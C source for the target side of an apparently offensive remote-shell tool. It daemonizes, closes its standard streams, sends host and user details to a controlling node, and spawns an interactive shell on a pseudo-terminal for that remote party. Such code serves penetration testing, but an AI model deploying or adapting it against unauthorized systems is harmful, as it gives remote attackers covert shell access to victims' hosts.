
#include "common.h"

#define LOCAL_BUFF_SIZE 128

/***********************************************************************************************************************
 *
 * do_target()
 *
 * Input: None. We will use the global io and config structs.
 *
 * Output: 0 for success, -1 on error.
 *
 * Purpose: This is the defining function for a target node.
 *
 **********************************************************************************************************************/
int do_target(){

	int retval;
	int fcntl_flags;

	char *pty_name;
	int pty_master, pty_slave;

	char **exec_argv;
	char **exec_envp;

	char *buff_head = NULL;

	struct winsize tty_winsize;

	struct passwd *passwd_entry;

	struct sockaddr addr;
	socklen_t addrlen = (socklen_t) sizeof(addr);

  struct utsname uname_info;
	char *shell = NULL;


	/* Initialize the structures we will be using. */

	/* Set up the network layer. */
	if((retval = init_io_target(config)) == -1){
		report_error("do_target(): init_io_connect(%lx): %s", (unsigned long) config, strerror(errno));
		return(-1);
	}

	// retval == -2  means target in keepalive mode (bindshell?) and parent is returning to handle another connection.	
	if(retval == -2){
		return(-2);
	}

	/* Set up the messaging layer. */
	if(negotiate_protocol() == -1){
		report_error("do_target(): negotiate_protocol(): %s", strerror(errno));
		return(-1);
	}

	/*  - Agree on interactive / non-interactive mode. */
	message->data_type = DT_INIT;
	message->data_len = sizeof(config->interactive);
	memcpy(message->data, &config->interactive, sizeof(config->interactive));

	if(message_push() == -1){
		report_error("do_target(): message->push(): %s", strerror(errno));
		return(-1);
	}

	if(message_pull() == -1){
		report_error("do_target(): message_pull(): %s", strerror(errno));
		return(-1);
	}

	if(message->data_type != DT_INIT){
		report_error("do_target(): DT_INIT interactive: Protocol violation!");
		return(-1);
	}

	io->interactive = 1;
	if(!(config->interactive && message->data[0])){
		io->interactive = 0;
	}

	if(!io->interactive){
		retval = broker(config);

		return(retval);
	}

	if(!verbose){
		/*  - Become a daemon. */
		umask(0);

		retval = fork();

		if(retval == -1){
			return(-1);
		}else if(retval){
			exit(0);
		}

		if(setsid() == -1){
			return(-1);
		}

		if(chdir("/") == -1){
			return(-1);
		}
	}

	/*  - Receive and set the shell. */
	if(message_pull() == -1){
		report_error("do_target(): message_pull(): %s", strerror(errno));
		return(-1);
	}

	if(message->data_type != DT_INIT){
		report_error("do_target(): invalid initialization: shell: Protocol violation!");
		return(-1);
	}


	if(message->data_len){
		// free() called in this function.
		if((shell = (char *) calloc(message->data_len + 1, sizeof(char))) == NULL){
			report_error("do_target(): calloc(%d, %d): %s", message->data_len + 1, (int) sizeof(char), strerror(errno));
			return(-1);
		}
		memcpy(shell, message->data, message->data_len);
	}

	/*  - Receive and set the initial environment. */
	if(message_pull() == -1){
		report_error("do_target(): message_pull(): %s", strerror(errno));
		return(-1);
	}

	if(message->data_type != DT_INIT){
		report_error("do_target(): DT_INIT environment: Protocol violation!");
		return(-1);
	}

	/* I should learn to be more trusting. */
	message->data[message->data_len] = '\0';

	if((exec_envp = string_to_vector(message->data)) == NULL){
		report_error("do_target(): string_to_vector(%s): %s", message->data, strerror(errno));
		return(-1);
	}

	/*  - Receive and set the initial termios. */
	if(message_pull() == -1){
		report_error("do_target(): message_pull(): %s", strerror(errno));
		return(-1);
	}

	if(message->data_type != DT_INIT){
		report_error("do_target(): DT_INIT termios: Protocol violation!");
		return(-1);
	}

	if(message->data_len != sizeof(tty_winsize.ws_row) + sizeof(tty_winsize.ws_col)){
		report_error("do_target(): DT_INIT termios: not enough data!");
		return(-1);
	}

	tty_winsize.ws_row = ntohs(*((unsigned short *) message->data));
	tty_winsize.ws_col = ntohs(*((unsigned short *) (message->data + sizeof(unsigned short))));

	// The initialization protocol is now finished. Rest of initialization is local.
	io->init_complete = 1;

	/*  - Create a pseudo-terminal (pty). */
	if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
		report_error("do_target(): posix_openpt(O_RDWR|O_NOCTTY): %s", strerror(errno));
		return(-1);
	}

	if(grantpt(pty_master) == -1){
		report_error("do_target(): grantpt(%d): %s", pty_master, strerror(errno));
		return(-1);
	}

	if(unlockpt(pty_master) == -1){
		report_error("do_target(): unlockpt(%d): %s", pty_master, strerror(errno));
		return(-1);
	}

	if(ioctl(pty_master, TIOCSWINSZ, &tty_winsize) == -1){
		report_error("do_target(): ioctl(%d, %d, %lx): %s", pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
		return(-1);
	}

	if((pty_name = ptsname(pty_master)) == NULL){
		report_error("do_target(): ptsname(%d): %s", pty_master, strerror(errno));
		return(-1);
	}

	if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
		report_error("do_target(): open(%s, O_RDWR|O_NOCTTY): %s", pty_name, strerror(errno));
		return(-1);
	}

	/*  - Send basic information back to the control node about the connecting host. */
	// free() called in this function.
	if((buff_head = (char *) calloc(LOCAL_BUFF_SIZE, sizeof(char))) == NULL){
		report_error("do_target(): calloc(%d, %d): %s", LOCAL_BUFF_SIZE, (int) sizeof(char), strerror(errno));
		return(-1);
	}

	if(uname(&uname_info) == -1){
		report_error("do_target(): uname(%lx): %s", (unsigned long) &uname, strerror(errno));
		return(-1);
	}

	remote_printf("\n\r################################################################################\r\n");
	remote_printf("# Hostname:\t\t%s\r\n", uname_info.nodename);
	remote_printf("# OS Name:\t\t%s\r\n", uname_info.sysname);
	remote_printf("# OS Release:\t\t%s\r\n", uname_info.release);
	remote_printf("# OS Version:\t\t%s\r\n", uname_info.version);
	remote_printf("# Arch:\t\t\t%s\r\n", uname_info.machine);


	remote_printf("# IP Address:\t\t");
	if(getsockname(io->remote_fd, &addr, &addrlen) != -1){
		if(inet_ntop(addr.sa_family, addr.sa_data + 2, buff_head, LOCAL_BUFF_SIZE - 1)){
			remote_printf("%s", buff_head);
		}
	}

	if(!buff_head[0]){
		remote_printf("I have no address!");
	}
	remote_printf("\r\n");
	free(buff_head);

	/*  if the uid doesn't match an entry in /etc/passwd, we don't want to crash. */
	/*  Borrowed the "I have no name!" convention from bash. */
	passwd_entry = getpwuid(getuid());
	remote_printf("# Real User:\t\t");
	if(passwd_entry && passwd_entry->pw_name){
		remote_printf("%s", passwd_entry->pw_name);
	}else{
		remote_printf("I have no name!");
	}
	remote_printf("\r\n");

	passwd_entry = getpwuid(geteuid());
	remote_printf("# Effective User:\t");
	if(passwd_entry && passwd_entry->pw_name){
		remote_printf("%s", passwd_entry->pw_name);
	}else{
		remote_printf("I have no name!");
	}
	remote_printf("\r\n");

	remote_printf("################################################################################\r\n");


	if(!io->orig_fds_closed){
		if(close(STDIN_FILENO) == -1){
			report_error("do_target(): close(STDIN_FILENO): %s", strerror(errno));
			return(-1);
		}

		if(close(STDOUT_FILENO) == -1){
			report_error("do_target(): close(STDOUT_FILENO): %s", strerror(errno));
			return(-1);
		}

		if(!verbose){
			if(close(STDERR_FILENO) == -1){
				report_error("do_target(): close(STDERR_FILENO): %s", strerror(errno));
				return(-1);
			}
		}
		io->orig_fds_closed = 1;
	}

	/*  - Fork a child to run the shell. */
	retval = fork();

	if(retval == -1){
		report_error("do_target(): fork(): %s\r\n", strerror(errno));
		return(-1);
	}

	if(retval){

		io->child_sid = retval;
		if(shell){
			free(shell);
		}
		free_vector(exec_envp);

		/*  - Parent: Enter broker() and broker tty. */
		if(close(pty_slave) == -1){
			report_error("do_target(): close(%d): %s", pty_slave, strerror(errno));
			return(-1);
		}

		io->local_in_fd = pty_master;
		io->local_out_fd = pty_master;

		/* Set the tty to non-blocking. */
		if((fcntl_flags = fcntl(io->local_in_fd, F_GETFL, 0)) == -1){
			report_error("do_target(): fcntl(%d, F_GETFL, 0): %s", io->local_in_fd, strerror(errno));
			return(-1);
		}

		fcntl_flags |= O_NONBLOCK;
		if(fcntl(io->local_in_fd, F_SETFL, fcntl_flags) == -1){
			report_error("do_target(): fcntl(%d, F_SETFL, %d): %s", io->local_in_fd, fcntl_flags, strerror(errno));
			return(-1);
		}

		if((fcntl_flags = fcntl(io->local_out_fd, F_GETFL, 0)) == -1){
			report_error("do_target(): fcntl(%d, F_GETFL, 0): %s", io->local_out_fd, strerror(errno));
			return(-1);
		}

		fcntl_flags |= O_NONBLOCK;
		if(fcntl(io->local_out_fd, F_SETFL, fcntl_flags) == -1){
			report_error("do_target(): fcntl(%d, F_SETFL, %d): %s", io->local_out_fd, fcntl_flags, strerror(errno));
			return(-1);
		}

		retval = broker(config);

		if(retval == -1 && !io->eof){
			report_error("do_target(): broker(%lx): %s", (unsigned long) config, strerror(errno));
			return(-1);
		}

		return(0);
	}

	/*  - Child: Initialize file descriptors. */
	if(close(pty_master) == -1){
		report_error("do_target(): close(%d): %s", pty_master, strerror(errno));
		return(-1);
	}
	if(dup2(pty_slave, STDIN_FILENO) == -1){
		report_error("do_target(): dup2(%d, STDIN_FILENO): %s", pty_slave, strerror(errno));
		return(-1);
	}

	if(dup2(pty_slave, STDOUT_FILENO) == -1){
		report_error("do_target(): dup2(%d, STDOUT_FILENO): %s", pty_slave, strerror(errno));
		return(-1);
	}

	if(dup2(pty_slave, STDERR_FILENO) == -1){
		report_error("do_target(): dup2(%d, %d): %s", pty_slave, STDERR_FILENO, strerror(errno));
		return(-1);
	}

	if(close(io->remote_fd) == -1){
		report_error("do_target(): close(%d): %s", io->remote_fd, strerror(errno));
		return(-1);
	}

	if(close(pty_slave) == -1){
		report_error("do_target(): close(%d): %s", pty_slave, strerror(errno));
		return(-1);
	}

	if(setsid() == -1){
		report_error("do_target(): setsid(): %s", strerror(errno));
		return(-1);
	} 

	/*  - Child: Set the pty as controlling. */
	if(ioctl(STDIN_FILENO, TIOCSCTTY, 1) == -1){
		report_error("do_target(): ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s", strerror(errno));
		return(-1);
	}

	if(!shell){
		if(config->shell){
			shell = config->shell;
		}else{
			shell = DEFAULT_SHELL;
		}
	}

	/*  - Child: Call execve() to invoke a shell. */
	errno = 0;
	if((exec_argv = string_to_vector(shell)) == NULL){
		report_error("do_target(): string_to_vector(%s): %s", shell, strerror(errno));
		return(-1);
	}

	execve(exec_argv[0], exec_argv, exec_envp);

	report_error("do_target(): execve(%s, %lx, %lx): %s", exec_argv[0], (unsigned long) message->data_type, (unsigned long) exec_envp, strerror(errno));
	return(-1);
}


/***********************************************************************************************************************
 *
 * remote_printf()
 *
 * Input: The fmt specification as you would find in a normal printf statement. We will also use the global io struct.
 * Output: 0 on success, -1 on failure.
 *
 * Purpose: Provide a printf() style wrapper that leverages the underlying message bus. Used by the target system 
 *          during initialization to send back system info for display to the user.
 *
 **********************************************************************************************************************/
int remote_printf(char *fmt, ...){

	int retval;
	va_list list_ptr;


	message->data_type = DT_TTY;

	va_start(list_ptr, fmt);

	if((retval = vsnprintf(message->data, io->message_data_size, fmt, list_ptr)) < 0){
		report_error("remote_printf(): vsnprintf(%lx, %d, %lx, %lx): %s", \
				(unsigned long) message->data, io->message_data_size, (unsigned long) fmt, (unsigned long) list_ptr, strerror(errno));
		return(-1);
	}

	va_end(list_ptr);
	if(retval == io->message_data_size){
		message->data[io->message_data_size - 1] = '\0';
	}

	message->data_len = retval;

	if(message_push() == -1){
		report_error("remote_printf(): message_push(): %s", strerror(errno));
		return(-1);
	}

	return(0);
}

